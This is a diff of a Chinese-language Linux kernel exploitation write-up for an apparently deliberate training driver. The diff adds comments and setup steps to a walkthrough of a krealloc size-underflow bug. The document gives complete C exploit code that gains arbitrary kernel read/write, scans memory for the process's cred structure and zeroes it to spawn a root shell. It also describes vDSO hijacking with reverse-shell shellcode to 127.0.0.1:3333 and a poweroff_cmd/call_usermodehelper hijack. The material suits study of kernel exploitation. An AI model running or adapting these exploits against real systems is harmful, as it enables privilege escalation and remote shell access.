@@ -17,11 +17,11 @@ ARBITRARY_RW_INIT
 			if(copy_from_user(&i_args, p_arg, sizeof(init_args)))//将用户输入传入
 				return -EINVAL;
 
-			ret = arbitrary_rw_init(&i_args);
+			ret = arbitrary_rw_init(&i_args);	//然后进这个函数,其实就是传入了一个size
 			break;
 		}
 ```
-其中init_args
+其中init_args结构如下
 ```
 	typedef struct init_args {
 		size_t size;
@@ -34,12 +34,12 @@ ARBITRARY_RW_INIT
 		if(args->size == 0 || g_mem_buffer != NULL)
 			return -EINVAL;
 
-		g_mem_buffer = kmalloc(sizeof(mem_buffer), GFP_KERNEL);
+		g_mem_buffer = kmalloc(sizeof(mem_buffer), GFP_KERNEL);//开辟一块内存空间
 
 		if(g_mem_buffer == NULL)
 			goto error_no_mem;
 
-		g_mem_buffer->data = kmalloc(args->size, GFP_KERNEL);
+		g_mem_buffer->data = kmalloc(args->size, GFP_KERNEL);	 //根据传入的大小为新分配的data赋值
 
 		if(g_mem_buffer->data == NULL)
 			goto error_no_mem_free;
@@ -82,16 +82,16 @@ ARBITRARY_RW_REALLOC
 			break;
 		}
 ```
-其中结构体
+其实就是传入了如下结构体
 ```
 	typedef struct realloc_args {
 		int grow;
 		size_t size;
 	}realloc_args;
 ```
-跟进函数
+跟进函数,发现这个函数就是一个重新定义的过程
 ```
-	static int realloc_mem_buffer(realloc_args *args)
+	static int realloc_mem_buffer(realloc_args *args)       //传入的参数就是一个int grow;,一个size_t size
 	{
 		if(g_mem_buffer == NULL)
 			return -EINVAL;
@@ -101,25 +101,66 @@ ARBITRARY_RW_REALLOC
 
 		//We can overflow size here by making new_size = -1
 		if(args->grow)
-			new_size = g_mem_buffer->data_size + args->size;
+			new_size = g_mem_buffer->data_size + args->size;    //g_mem_buffer就是之前介绍的全局变量,通过控制args->size,使new_size为-1
 		else
 			new_size = g_mem_buffer->data_size - args->size;
 
 		//new_size here will equal 0 krealloc(..., 0) = ZERO_SIZE_PTR
-		new_data = krealloc(g_mem_buffer->data, new_size+1, GFP_KERNEL);
+		new_data = krealloc(g_mem_buffer->data, new_size+1, GFP_KERNEL);     //kmalloc(0)会返回0x10
 
 		//missing check for return value ZERO_SIZE_PTR
 		if(new_data == NULL)
 			return -ENOMEM;
 
-		g_mem_buffer->data = new_data;
-		g_mem_buffer->data_size = new_size;
+		g_mem_buffer->data = new_data;      //0x10
+		g_mem_buffer->data_size = new_size;     //0xffffffffffffffff
 
 		printk(KERN_INFO "[x] g_mem_buffer->data_size = %lu [x]\n", g_mem_buffer->data_size);
 
 		return 0;
 	}
 ```
+再分析读取
+```
+		case ARBITRARY_RW_READ:
+		{
+			read_args r_args;
+
+			if(copy_from_user(&r_args, p_arg, sizeof(read_args)))
+				return -EINVAL;
+
+			ret = read_mem_buffer(r_args.buff, r_args.count);
+			break;
+		}
+```
+其中结构体
+```
+	typedef struct read_args {
+		char *buff;
+		size_t count;
+	}read_args;
+```
+跟进读取函数
+```
+	static int read_mem_buffer(char __user *buff, size_t count)     //  一个是 char *buff; 一个是 size_t count;
+	{
+		if(g_mem_buffer == NULL)
+			return -EINVAL;
+
+		loff_t pos;
+		int ret;
+
+		pos = g_mem_buffer->pos;
+
+		if((count + pos) > g_mem_buffer->data_size)
+			return -EINVAL;
+
+		ret = copy_to_user(buff, g_mem_buffer->data + pos, count);// g_mem_buffer->data + pos, count 均可控,造成任意地址读取
+
+		return ret;
+	}
+```
+
 漏洞：`realloc_mem_buffer()`中未检查传入变量`args->size`的正负，可以传入负数。如果通过传入负数，使得`new_size== -1`，由于`kmalloc(new_size+1)`，由于`kmalloc(0)`会返回`0x10`，这样`g_mem_buffer->data == 0x10`; `g_mem_buffer->data_size == 0xffffffffffffffff`，读写时只会检查是否满足`((count + pos) < g_mem_buffer->data_size)`条件，实现任意地址读写。
 
 ### 方法一：修改cred结构提权
@@ -142,7 +183,7 @@ struct task_struct {
                      * credentials (COW) */
     const struct cred __rcu *cred;  /* effective (overridable) subjective task
                      * credentials (COW) */
-    char comm[TASK_COMM_LEN]; /* executable name excluding path
+    char comm[TASK_COMM_LEN];		//根据这个查找 /* executable name excluding path
                      - access with [gs]et_task_comm (which lock
                        it with task_lock())
                      - initialized normally by setup_new_exec */
@@ -173,6 +214,29 @@ static inline struct task_struct *alloc_task_struct_node(int node)
 ```
 根据内存映射图，爆破范围应该在0xffff880000000000~0xffffc80000000000。
 
+
+#### 开始
+首先解压cpio文件
+```
+cpio -idmv < vuln_driver.cpio
+```
+压缩系统文件
+```
+find . | cpio -o --format=newc > ../rootfs.img
+```
+启动脚本
+```
+#!/bin/sh
+qemu-system-x86_64 \
+	-m 1024 -smp cores=2,threads=2,sockets=1 \
+	-display none -serial stdio -no-reboot \
+	-cpu kvm64,+smep \
+	-initrd ./rootfs.img \
+	-kernel ./bzImage \
+	-gdb tcp::1234 \
+	-append "console=ttyS0 root=/dev/ram rw oops=panic panic=1 quiet "
+```
+
 完整的代码
 ```
 #define _GNU_SOURCE
@@ -199,23 +263,23 @@ static inline struct task_struct *alloc_task_struct_node(int node)
 #include <sys/prctl.h>
 
 #ifndef _VULN_DRIVER_
-	#define _VULN_DRIVER_
-	#define DEVICE_NAME "vulnerable_device"
-	#define IOCTL_NUM 0xFE
-	#define DRIVER_TEST _IO (IOCTL_NUM,0)
-	#define BUFFER_OVERFLOW _IOR (IOCTL_NUM,1,char *)
-	#define NULL_POINTER_DEREF _IOR (IOCTL_NUM,2,unsigned long)
-	#define ALLOC_UAF_OBJ _IO (IOCTL_NUM,3)
-	#define USE_UAF_OBJ _IO (IOCTL_NUM,4)
-	#define ALLOC_K_OBJ _IOR (IOCTL_NUM,5,unsigned long)
-	#define FREE_UAF_OBJ _IO (IOCTL_NUM,6)
-	#define ARBITRARY_RW_INIT _IOR(IOCTL_NUM,7, unsigned long)
-	#define ARBITRARY_RW_REALLOC _IOR(IOCTL_NUM,8,unsigned long)
-	#define ARBITRARY_RW_READ _IOWR(IOCTL_NUM,9,unsigned long)
-	#define ARBITRARY_RW_SEEK _IOR(IOCTL_NUM,10,unsigned long)
-	#define ARBITRARY_RW_WRITE _IOR(IOCTL_NUM,11,unsigned long)
-	#define UNINITIALISED_STACK_ALLOC _IOR(IOCTL_NUM,12,unsigned long)
-	#define UNINITIALISED_STACK_USE _IOR(IOCTL_NUM,13,unsigned long)
+#define _VULN_DRIVER_
+#define DEVICE_NAME "vulnerable_device"
+#define IOCTL_NUM 0xFE
+#define DRIVER_TEST _IO (IOCTL_NUM,0)
+#define BUFFER_OVERFLOW _IOR (IOCTL_NUM,1,char *)
+#define NULL_POINTER_DEREF _IOR (IOCTL_NUM,2,unsigned long)
+#define ALLOC_UAF_OBJ _IO (IOCTL_NUM,3)
+#define USE_UAF_OBJ _IO (IOCTL_NUM,4)
+#define ALLOC_K_OBJ _IOR (IOCTL_NUM,5,unsigned long)
+#define FREE_UAF_OBJ _IO (IOCTL_NUM,6)
+#define ARBITRARY_RW_INIT _IOR(IOCTL_NUM,7, unsigned long)
+#define ARBITRARY_RW_REALLOC _IOR(IOCTL_NUM,8,unsigned long)
+#define ARBITRARY_RW_READ _IOWR(IOCTL_NUM,9,unsigned long)
+#define ARBITRARY_RW_SEEK _IOR(IOCTL_NUM,10,unsigned long)
+#define ARBITRARY_RW_WRITE _IOR(IOCTL_NUM,11,unsigned long)
+#define UNINITIALISED_STACK_ALLOC _IOR(IOCTL_NUM,12,unsigned long)
+#define UNINITIALISED_STACK_USE _IOR(IOCTL_NUM,13,unsigned long)
 #endif
 
 #define PATH "/dev/vulnerable_device"
@@ -223,118 +287,118 @@ static inline struct task_struct *alloc_task_struct_node(int node)
 #define END_ADDR 0xffffc80000000000
 
 struct init_args {
-	size_t size;
+    size_t size;
 };
 struct realloc_args{
-	int grow;
-	size_t size;
+    int grow;
+    size_t size;
 };
 struct read_args{
-	char *buff;
-	size_t count;
+    char *buff;
+    size_t count;
 };
 struct seek_args{
-	loff_t new_pos;
+    loff_t new_pos;
 };
 struct write_args{
-	char *buff;
-	size_t count;
+    char *buff;
+    size_t count;
 };
 
 int read_mem(int fd, size_t addr,char *buff,int count)
 {
-	struct seek_args s_args2;
-	struct read_args r_args;
-	int ret;
+    struct seek_args s_args2;
+    struct read_args r_args;
+    int ret;
 
-	s_args2.new_pos=addr-0x10;
-	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args2);  // seek
-	r_args.buff=buff;
-	r_args.count=count;
-	ret=ioctl(fd,ARBITRARY_RW_READ,&r_args);   // read
-	return ret;
+    s_args2.new_pos=addr-0x10;
+    ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args2);  // seek
+    r_args.buff=buff;
+    r_args.count=count;
+    ret=ioctl(fd,ARBITRARY_RW_READ,&r_args);   // read
+    return ret;
 }
 int write_mem(int fd, size_t addr,char *buff,int count)
 {
-	struct seek_args s_args1;
-	struct write_args w_args;
-	int ret;
+    struct seek_args s_args1;
+    struct write_args w_args;
+    int ret;
 
-	s_args1.new_pos=addr-0x10;
-	ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args1);  // seek
-	w_args.buff=buff;
-	w_args.count=count;
-	ret=ioctl(fd,ARBITRARY_RW_WRITE,&w_args);  // write
-	return ret;
+    s_args1.new_pos=addr-0x10;
+    ret=ioctl(fd,ARBITRARY_RW_SEEK,&s_args1);  // seek
+    w_args.buff=buff;
+    w_args.count=count;
+    ret=ioctl(fd,ARBITRARY_RW_WRITE,&w_args);  // write
+    return ret;
 }
 
 int main()
 {
-	int fd=-1;
-	int result=0;
-	struct init_args i_args;
-	struct realloc_args rello_args;
-	size_t real_cred=0;
-	size_t cred=0;
-	size_t target_addr;
-	int root_cred[12];
+    int fd=-1;
+    int result=0;
+    struct init_args i_args;
+    struct realloc_args rello_args;
+    size_t real_cred=0;
+    size_t cred=0;
+    size_t target_addr;
+    int root_cred[12];
 
-	setvbuf(stdout, 0LL, 2, 0LL);
-	char *buf=malloc(0x1000);
-	char target[16];
+    setvbuf(stdout, 0LL, 2, 0LL);       //定义流 stream 应如何缓冲
+    char *buf=malloc(0x1000);
+    char target[16];
 
-	strcpy(target,"try2findmesauce");
-	prctl(PR_SET_NAME,target);  //将特定字符串写入
-	fd=open(PATH,O_RDWR);
-	if (fd<0){
-		puts("[-] open error ! \n");
-		exit(-1);
-	}
-	//  爆破出 cred地址
-	i_args.size=0x100;
-	ioctl(fd, ARBITRARY_RW_INIT, &i_args);
-	rello_args.grow=0;
-	rello_args.size=0x100+1;
-	ioctl(fd,ARBITRARY_RW_REALLOC,&rello_args);
-	puts("[+] We can read and write any memory! [+]");
-	for (size_t addr=START_ADDR; addr<END_ADDR; addr+=0x1000)       //开始爆破
-	{
-		read_mem(fd,addr,buf,0x1000);
-		result=memmem(buf,0x1000,target,16);//memmem是一个C库函数，用于在一块内存中寻找匹配另一块内存的内容的第一个位置
-		if (result)
-		{
-			printf("[+] Find try2findmesauce at : %p\n",result);
-			cred=*(size_t *)(result-0x8);
-			real_cred=*(size_t *)(result-0x10);
-			if ((cred || 0xff00000000000000) && (real_cred == cred))
-			{
-				target_addr=addr+result-(long int)(buf);
-				printf("[+] found task_struct 0x%x\n",target_addr);
-				printf("[+] found cred 0x%lx\n",real_cred);
-				break;
-			}
-		}
-	}
-	if (result==0)
-	{
-		puts("[-] not found, try again! \n");
-		exit(-1);
-	}
-	// 修改cred
-	memset((char *)root_cred,0,28);
-	write_mem(fd,cred,root_cred,28);
+    strcpy(target,"try2findmesauce");
+    prctl(PR_SET_NAME,target);              //通过prctl设置字符串为try2findmesauce
+    fd=open(PATH,O_RDWR);                   //      打开驱动/dev/vulnerable_device
+    if (fd<0){
+        puts("[-] open error ! \n");
+        exit(-1);
+    }
+    //  爆破出 cred地址
+    i_args.size=0x100;
+    ioctl(fd, ARBITRARY_RW_INIT, &i_args);      // 进行初始化,data大小为0x100
+    rello_args.grow=0;
+    rello_args.size=0x100+1;
+    ioctl(fd,ARBITRARY_RW_REALLOC,&rello_args);             // 重新分配地址data大小,这里使 g_mem_buffer->data=0x10,g_mem_buffer->data_size = 0xffffffffffffffff
+    puts("[+] We can read and write any memory! [+]");
+    for (size_t addr=START_ADDR; addr<END_ADDR; addr+=0x1000)
+    {
+        read_mem(fd,addr,buf,0x1000);                   // 每次读取0x1000
+        result=memmem(buf,0x1000,target,16);            //然后进行查找
+        if (result)
+        {
+            printf("[+] Find try2findmesauce at : %p\n",result);
+            cred=*(size_t *)(result-0x8);               //根据相对位置,找出cred位置
+            real_cred=*(size_t *)(result-0x10);         // 再找出real_cred的位置
+            if ((cred || 0xff00000000000000) && (real_cred == cred))
+            {
+                target_addr=addr+result-(long int)(buf);
+                printf("[+] found task_struct 0x%x\n",target_addr);
+                printf("[+] found cred 0x%lx\n",real_cred);
+                break;
+            }
+        }
+    }
+    if (result==0)
+    {
+        puts("[-] not found, try again! \n");
+        exit(-1);
+    }
+    // 修改cred
+    memset((char *)root_cred,0,28);
+    write_mem(fd,cred,root_cred,28);
 
-	if (getuid()==0)
-	{
-		printf("[+] Now you are r00t, enjoy your shell\n");
-		system("/bin/sh");
-	}
-	else
-	{
-		puts("[-] There are something wrong!\n");
-		exit(-1);
-	}
-	return 0;
+    if (getuid()==0)
+    {
+        printf("[+] Now you are r00t, enjoy your shell\n");
+        system("/bin/sh");
+    }
+    else
+    {
+        puts("[-] There are something wrong!\n");
+        exit(-1);
+    }
+    return 0;
 }
 ```
 ### 方法二：劫持VDSO
@@ -505,7 +569,7 @@ syscall
 ```
 它将连接到127.0.0.1:3333并执行”/bin/sh”），用"nc -l -p 3333 -v"链接即可；shellcode写到gettimeofday附近，通过dump vDSO确定，本题是0xca0
 ##### 整合利用步骤
-由于进程不会主动调用gettimeofday来触发shellcode，所以我们自己写一个循环程序，不断调用gettimeofday。
+由于进程不会主动调用gettimeofday来触发shellcode，所以我们自己写一个循环程序，不断调用gettimeofday。,然后在init中后台启动
 ```
 //sudo_me.c           一定要动态编译，不然不会调用gettimeofday函数,还要在_install根目录下创建lib64文件，文件里放需要用到的库（ld-linux-x86-64.so.2 和 libc.so.6）。
 #include <stdio.h>
@@ -517,6 +581,10 @@ int main(){
         gettimeofday();
     }
 }
+```
+在init中添加如下代码
+```
+nohup /sudo_me &
 ```
 exp代码
 ```
@@ -641,7 +709,7 @@ int main()
 
 	setvbuf(stdout, 0LL, 2, 0LL);
 	char *buf=malloc(0x1000);
-	fd=open(PATH,O_RDWR);
+	fd=open(PATH,O_RDWR);       // 打开   /dev/vulnerable_device
 	if (fd<0){
 		puts("[-] open error ! \n");
 		exit(-1);
@@ -656,8 +724,8 @@ int main()
 	//爆破VDSO地址
 	for (size_t addr=START_ADDR; addr<END_ADDR; addr+=0x1000)
 	{
-		read_mem(fd,addr,buf,0x1000);
-		if (!strcmp("gettimeofday",buf+0x2cd))
+		read_mem(fd,addr,buf,0x1000);   // 遍历读取0x1000
+		if (!strcmp("gettimeofday",buf+0x2cd))      // 根据字符串的偏移找到vdso的位置
 		{
 			result=addr;
 			printf("[+] found vdso 0x%lx\n",result);
@@ -670,7 +738,7 @@ int main()
 		exit(-1);
 	}
 	// shellcode写到VDSO,覆盖gettimeofday
-	write_mem(fd,result+0xc80, shellcode,strlen(shellcode));    //  $ objdump xxx -T  查看gettimeofday代码偏移
+	write_mem(fd,result+0xc80, shellcode,strlen(shellcode));    //  函数的偏移进行覆盖
 
 	if (check_vdso_shellcode(shellcode)!=0)
 	{
@@ -689,6 +757,45 @@ int main()
 #### 方法三：利用call_usermodehelper()
 同样是利用任意地址修改,劫持某个函数,然后调用,进行提权
 
-https://xz.aliyun.com/t/6296#toc-6
+#### call_usermodehelper()原理
+call_usermodehelper（\kernel\kmod.c 603），这个函数可以在内核中直接新建和运行用户空间程序，并且该程序具有root权限，因此只要将参数传递正确就可以执行任意命令（注意命令中的参数要用全路径，不能用相对路径）。但其中提到在安卓利用时需要关闭SEAndroid。
 
-http://p4nda.top/2018/11/07/stringipc/#3-HijackPrctl
+我们要劫持task_prctl到call_usermoderhelper吗，不是的，因为这里的第一个参数也是64位的，也不能直接劫持过来。但是内核中有些代码片段是调用了Call_usermoderhelper的，可以转化为我们所用（通过它们来执行用户代码或访问用户数据，绕过SMEP）。
+
+也就是有些函数从内核调用了用户空间，例如kernel/reboot.c中的__orderly_poweroff函数中调用了run_cmd参数是poweroff_cmd,而且poweroff_cmd是一个全局变量，可以修改后指向我们的命令。
+
+```
+static int __orderly_poweroff(bool force)
+{
+    int ret;
+
+    ret = run_cmd(poweroff_cmd);
+
+    if (ret && force) {
+        pr_warn("Failed to start orderly shutdown: forcing the issue\n");
+
+        /*
+         * I guess this should try to kick off some daemon to sync and
+         * poweroff asap.  Or not even bother syncing if we're doing an
+         * emergency shutdown?
+         */
+        emergency_sync();
+        kernel_power_off();
+    }
+
+    return ret;
+}
+
+static void poweroff_work_func(struct work_struct *work)
+{
+    __orderly_poweroff(poweroff_force);
+}
+```
+##### 利用步骤
+
+1. 利用kremalloc的问题，达到任意地址读写的能力
+2. 通过快速爆破，泄露出VDSO地址。
+3. 利用VDSO和kernel_base相差不远的特性，泄露出内核基址。（泄露VDSO是为了泄露内核基址？）
+4. 篡改poweroff_cmd使其等于我们预期执行的命令（"/bin/chmod 777 /flag\0"）。或者将poweroff_cmd处改为一个反弹shell的binary命令，监听端口就可以拿到shell。
+5. 篡改prctl的hook为orderly_poweroff
+6. 调用prctl执行我们预期的命令，达到内核提权的效果。
